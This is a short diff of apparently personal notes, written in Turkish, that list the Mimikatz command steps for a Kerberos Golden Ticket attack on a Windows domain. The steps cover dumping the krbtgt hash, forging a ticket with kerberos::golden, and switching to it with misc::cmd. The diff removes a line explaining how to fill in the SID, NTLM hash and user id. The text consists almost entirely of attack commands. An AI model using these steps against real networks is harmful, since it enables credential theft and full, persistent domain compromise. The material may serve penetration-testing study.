@@ -1,5 +1,5 @@
 1)lsadump::lsa /inject /name:krbtgt kullanılarak altın bilet oluşturmak için gereken bütün hashleri çıkartır
 
-2)Kerberos::golden /user:kullanıcı /domain:domain.asdfa /sid: /krbtgt: /id: == sid yerinde S ile başlayan domain'in soludnaki kısım, krbtgt yerine NTLM hash'i, id yerine ise 500den büyük bir şey veriyoruz
+2)Kerberos::golden /user:kullanıcı /domain:domain.asdfa /sid: /krbtgt: /id: 
 
 3) misc::cmd kullanılarak yeni ticketımıza geçiş yapılır
